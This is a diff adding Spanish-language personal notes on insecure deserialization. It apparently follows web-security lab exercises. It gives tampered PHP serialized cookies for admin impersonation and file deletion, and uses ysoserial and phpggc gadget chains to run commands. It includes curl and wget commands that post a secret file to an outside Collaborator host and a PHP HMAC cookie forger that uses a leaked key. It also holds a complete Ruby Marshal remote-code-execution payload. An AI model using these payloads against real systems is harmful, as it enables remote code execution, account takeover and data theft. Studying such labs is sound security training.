@@ -1,0 +1,133 @@
+0:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
+
+Objeto de 4 caracteres, 2 atributos, cuantos caracteres tiene cada uno y valor booleano true en 1
+buscar unserialize() en el código fuente
+InputStream
+readObject
+java.io.Serializable
+
+Estos archivos empiezan con los mimsos Bytes significa que son datos Serializado
+ac ed --> base64
+ro0 --> hexadecimal
+
+
+Cambiamos wiener por administrator, contando los caracteres uy al final ponemos i:0
+Base64 encode a esto --> O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+Cambiamos cookie en el browser
+
+Nos damos cuenta de las funciones que hay
+un botón que deletea una imagen, cambniamos esa imagen por /home/carlos/morale.txt
+encode base64 --> O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ww3sjbpw5ajq9c3rph9le5xlmnty0h3c";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+al lanzar la request deletea el archivo
+
+Miramos en target archivo sJs buscando alguna función de deleteo, lectura de algún archivo o exfilrtración
+CustomTemplate.js~  --> si el JS no deja leerse utilizamos ~
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+
+
+
+CONFIG DESERIALIZATION SCANNER
+
+java PATH=  C:\Program Files (x86)\Java\jre1.8.0_431\bin\java.exe 
+java ysoseryal= D:\Asignaturas\MasterClass\Burp\extensiones\ysoserial-all.jar
+
+
+IMPORTANTE TENER Java8
+Para saber si una cookie está serializada
+echo 'cookie' | base64 -d > nombredecookie
+file nombredecookie
+mv nombredecookie nombredecookie.gzip --> o con la extensión que esté compressed
+gunzip nombredecookie.gzip
+cat nombredecookiedescompressed
+
+EN KALI
+java -jar ysoserial-all.jar CommonsCollections(1-2-3-4-5-6-7) 'rm /morale.txt' | base64 -w 0 --> para que las lineas no se separen
+Encodeamos a URL la salida y lo  pegamos en la cookie
+
+EN BURP 
+añadimos insert point y escaneamos decodeando en el orden opuesto, DNS VULN libraries
+si es CommonsCollections(1-2-3-4-5-6)
+CommonsCollections(1-2-3-4-5-6-7) 'curl -d @/home/carlos/secret https://collaborator.com'
+CommonsCollections(1-2-3-4-5-6-7) '/usr/bin/wget --post-file /home/carlos/secret https://collaborator.com'
+decodeamos en orden opuesto como antes
+Atacamos y esperamos respuesta en collaborator
+
+Install en KALI
+ https://github.com/ambionics/phpggc.git
+EN CASO DE QUE LA COOKIE tenga base64 dentro del objeto 
+ Buscamos leaks en archivos de la web  "secret" "key" "admin"
+ Cambiamos la cookie de forma random 
+ nos suelta errores
+ Symfony Version: 4.3.6
+ sudo ./phpggc -l | grep -Fi "Symfony"
+ Buscamos entre esa versión puede ser 4.3.0 - 4.3.10 y ponemos la referencia de la izquierda 
+ sudo ./phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" | base64 -w 0
+Nos suelta un churro en base64
+
+<?php
+$object = "CHURRO_BASE64";
+$secretKey = "secret_keyLeakeada en Archivocgibin";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+guardamos a chmod +x archivo.php
+nos suelta la cookie y pegamos en una request para atacar
+
+
+CUANDO SEA RUBY 
+require 'net/http'
+require 'rubygems/package'
+require 'base64' # Agregar este require para usar Base64
+
+# Autoload las clases necesarias
+Gem::SpecFetcher
+Gem::Installer
+
+# Modificar la clase `Gem::Requirement` para manejar correctamente marshal_dump/marshal_load
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+
+    def marshal_load(array)
+      @requirements = array[0]
+    end
+  end
+end
+
+# Crear el payload
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+
+# Codificar el payload en Base64
+puts Base64.encode64(payload)
+
+# Deserializar el payload
+begin
+  result = Marshal.load(payload)
+  puts "Payload deserializado exitosamente: #{result.inspect}"
+rescue => e
+  puts "Error al deserializar el payload: #{e.message}"
+end
+Le quitamos los espacios y pegamos la salida en la cookie
